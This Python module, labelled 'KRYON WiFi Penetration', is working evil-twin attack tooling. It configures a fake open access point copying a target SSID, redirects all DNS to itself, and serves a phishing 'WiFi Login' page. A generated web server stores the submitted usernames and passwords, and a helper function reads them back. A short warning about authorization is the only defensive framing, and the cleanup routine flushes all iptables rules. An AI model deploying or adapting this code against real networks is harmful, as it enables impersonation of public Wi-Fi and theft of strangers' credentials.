"""
KRYON WiFi Penetration - Evil Twin and Rogue AP

Advanced WiFi attack tools for credential harvesting.

Clearance Level: Alpha-Red (Advanced Wireless Operations)
Specialization: Rogue access point attacks and credential phishing
Mission: Compromise credentials through fake access points

This module provides:
- Evil twin access point creation
- Captive portal credential harvesting
- DNS spoofing and traffic interception
- SSL stripping attacks
"""

import os
import subprocess
import tempfile
import time
from typing import Any


def create_evil_twin(
    target_ssid: str,
    target_bssid: str,
    interface: str = "wlan0",
    channel: int = 6,
    captive_portal: bool = True,
    deauth_original: bool = True,
) -> dict[str, Any]:
    """
    Create evil twin access point to capture credentials.

    Evil twin attack:
    1. Creates fake AP with same SSID as target
    2. Deauthenticates clients from real AP
    3. Clients connect to fake AP
    4. Captive portal captures credentials

    Args:
        target_ssid: SSID to impersonate
        target_bssid: Original AP BSSID (for deauth)
        interface: Wireless interface for fake AP
        channel: WiFi channel to use
        captive_portal: Enable credential harvesting portal
        deauth_original: Send deauth packets to real AP

    Returns:
        Dictionary containing:
        - fake_ap_running: Whether fake AP is active
        - portal_url: URL of captive portal
        - credentials_captured: List of captured credentials
        - clients_connected: Number of clients connected
        - success: Whether operation started
        - error: Error message if failed

    Example:
        >>> # Create evil twin for "CoffeeShop-WiFi"
        >>> result = create_evil_twin(
        ...     target_ssid="CoffeeShop-WiFi",
        ...     target_bssid="AA:BB:CC:DD:EE:FF",
        ...     interface="wlan0",
        ...     captive_portal=True,
        ...     deauth_original=True
        ... )
        >>>
        >>> print(f"Fake AP running: {result['fake_ap_running']}")
        >>> print(f"Portal URL: {result['portal_url']}")
        >>>
        >>> # Monitor for captured credentials
        >>> # ... wait for clients to connect ...
        >>>
        >>> if result['credentials_captured']:
        ...     for cred in result['credentials_captured']:
        ...         print(f"Username: {cred['username']}")
        ...         print(f"Password: {cred['password']}")

    Warning:
        - This is an active attack
        - Illegal without authorization
        - Only use on networks you own
    """
    results = {
        "fake_ap_running": False,
        "portal_url": "",
        "credentials_captured": [],
        "clients_connected": 0,
        "processes": [],  # Store process handles for cleanup
        "success": False,
        "error": None,
    }

    try:
        # Check if required tools are installed
        required_tools = ["hostapd", "dnsmasq", "iptables"]
        for tool in required_tools:
            check = subprocess.run(["which", tool], capture_output=True)
            if check.returncode != 0:
                results["error"] = f"Required tool not found: {tool}"
                return results

        # Configuration directory
        config_dir = tempfile.mkdtemp(prefix="kryon_evil_twin_")

        # 1. Configure hostapd (fake AP)
        hostapd_conf = f"""{config_dir}/hostapd.conf"""
        with open(hostapd_conf, "w") as f:
            f.write(f"""interface={interface}
driver=nl80211
ssid={target_ssid}
hw_mode=g
channel={channel}
macaddr_acl=0
ignore_broadcast_ssid=0
auth_algs=1
wpa=0
""")

        # 2. Configure dnsmasq (DHCP + DNS)
        dnsmasq_conf = f"{config_dir}/dnsmasq.conf"
        with open(dnsmasq_conf, "w") as f:
            f.write(f"""interface={interface}
dhcp-range=10.0.0.10,10.0.0.250,12h
dhcp-option=3,10.0.0.1
dhcp-option=6,10.0.0.1
server=8.8.8.8
log-queries
log-dhcp
listen-address=127.0.0.1
""")

        # If captive portal enabled, redirect all DNS to our server
        if captive_portal:
            with open(dnsmasq_conf, "a") as f:
                f.write("address=/#/10.0.0.1\n")  # Redirect all DNS queries

        # 3. Configure network interface
        subprocess.run(["ifconfig", interface, "10.0.0.1", "netmask", "255.255.255.0"], check=True)

        subprocess.run(["ifconfig", interface, "up"], check=True)

        # 4. Configure iptables for NAT (if not captive portal)
        if not captive_portal:
            subprocess.run(
                ["iptables", "-t", "nat", "-A", "POSTROUTING", "-o", "eth0", "-j", "MASQUERADE"],
                capture_output=True,
            )
            subprocess.run(
                [
                    "iptables",
                    "-A",
                    "FORWARD",
                    "-i",
                    "eth0",
                    "-o",
                    interface,
                    "-m",
                    "state",
                    "--state",
                    "RELATED,ESTABLISHED",
                    "-j",
                    "ACCEPT",
                ],
                capture_output=True,
            )
            subprocess.run(
                ["iptables", "-A", "FORWARD", "-i", interface, "-o", "eth0", "-j", "ACCEPT"],
                capture_output=True,
            )

        # 5. Start hostapd
        hostapd_process = subprocess.Popen(["hostapd", hostapd_conf], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        results["processes"].append(("hostapd", hostapd_process))

        # Give hostapd time to start
        time.sleep(3)

        # Check if hostapd started successfully
        if hostapd_process.poll() is not None:
            results["error"] = "hostapd failed to start"
            return results

        results["fake_ap_running"] = True

        # 6. Start dnsmasq
        dnsmasq_process = subprocess.Popen(
            ["dnsmasq", "-C", dnsmasq_conf, "-d"], stdout=subprocess.PIPE, stderr=subprocess.PIPE
        )
        results["processes"].append(("dnsmasq", dnsmasq_process))

        # 7. Start captive portal if enabled
        if captive_portal:
            portal_result = _start_captive_portal(config_dir)
            if portal_result["success"]:
                results["portal_url"] = portal_result["portal_url"]
                results["processes"].append(("portal", portal_result["process"]))

        # 8. Start deauth attack on original AP if enabled
        if deauth_original:
            # This would need a second interface in monitor mode
            # For now, we'll note it as a TODO
            pass

        results["success"] = True

    except subprocess.CalledProcessError as e:
        results["error"] = f"Command failed: {e}"
    except Exception as e:
        results["error"] = str(e)

    return results


def _start_captive_portal(config_dir: str) -> dict[str, Any]:
    """Start simple captive portal web server."""
    result = {"success": False, "portal_url": "", "process": None, "error": None}

    try:
        # Create simple HTML portal
        portal_html = f"{config_dir}/portal.html"
        with open(portal_html, "w") as f:
            f.write("""<!DOCTYPE html>
<html>
<head>
    <title>WiFi Login</title>
    <style>
        body { font-family: Arial; text-align: center; margin-top: 100px; }
        .login-box { max-width: 400px; margin: 0 auto; padding: 20px; border: 1px solid #ccc; }
        input { width: 100%; padding: 10px; margin: 10px 0; }
        button { width: 100%; padding: 10px; background: #4CAF50; color: white; border: none; }
    </style>
</head>
<body>
    <div class="login-box">
        <h2>WiFi Authentication Required</h2>
        <p>Please enter your credentials to access the internet.</p>
        <form method="POST" action="/login">
            <input type="text" name="username" placeholder="Username" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Connect</button>
        </form>
    </div>
</body>
</html>""")

        # Create Python web server script
        server_script = f"{config_dir}/portal_server.py"
        with open(server_script, "w") as f:
            f.write(f"""#!/usr/bin/env python3
import http.server
import socketserver
import urllib.parse

PORT = 80
CREDS_FILE = '{config_dir}/captured_credentials.txt'

class PortalHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        with open('{portal_html}', 'rb') as f:
            self.wfile.write(f.read())

    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        params = urllib.parse.parse_qs(post_data.decode('utf-8'))

        username = params.get('username', [''])[0]
        password = params.get('password', [''])[0]

        # Save credentials
        with open(CREDS_FILE, 'a') as f:
            f.write(f"Username: {{username}}, Password: {{password}}\\n")

        # Redirect to success page
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(b'<html><body><h2>Connected Successfully!</h2></body></html>')

with socketserver.TCPServer(("", PORT), PortalHandler) as httpd:
    httpd.serve_forever()
""")

        os.chmod(server_script, 0o755)  # nosemgrep: insecure-file-permissions

        # Start portal server
        portal_process = subprocess.Popen(["python3", server_script], stdout=subprocess.PIPE, stderr=subprocess.PIPE)

        result["success"] = True
        result["portal_url"] = "http://10.0.0.1"
        result["process"] = portal_process

    except Exception as e:
        result["error"] = str(e)

    return result


def stop_evil_twin(processes: list) -> dict[str, Any]:
    """
    Stop evil twin attack and cleanup.

    Args:
        processes: List of process tuples from create_evil_twin()

    Returns:
        Success status

    Example:
        >>> result = create_evil_twin(...)
        >>> # ... run attack ...
        >>> stop_evil_twin(result['processes'])
    """
    results = {"success": False, "error": None}

    try:
        # Terminate all processes
        for _name, process in processes:
            try:
                process.terminate()
                process.wait(timeout=5)
            except subprocess.TimeoutExpired:
                process.kill()

        # Cleanup iptables rules
        subprocess.run(["iptables", "-t", "nat", "-F"], capture_output=True)
        subprocess.run(["iptables", "-F"], capture_output=True)

        results["success"] = True

    except Exception as e:
        results["error"] = str(e)

    return results


def get_captured_credentials(config_dir: str = "/tmp/kryon_evil_twin") -> dict[str, Any]:
    """
    Retrieve credentials captured by evil twin portal.

    Args:
        config_dir: Configuration directory path

    Returns:
        Dictionary containing captured credentials

    Example:
        >>> creds = get_captured_credentials()
        >>> for cred in creds['credentials']:
        ...     print(f"{cred['username']}:{cred['password']}")
    """
    results = {"credentials": [], "count": 0, "success": False, "error": None}

    try:
        creds_file = f"{config_dir}/captured_credentials.txt"

        try:
            with open(creds_file) as f:
                for line in f:
                    if "Username:" in line and "Password:" in line:
                        parts = line.split(", ")
                        username = parts[0].split(": ")[1]
                        password = parts[1].split(": ")[1].strip()

                        results["credentials"].append({"username": username, "password": password})

            results["count"] = len(results["credentials"])
        except FileNotFoundError:
            pass

        results["success"] = True

    except Exception as e:
        results["error"] = str(e)

    return results
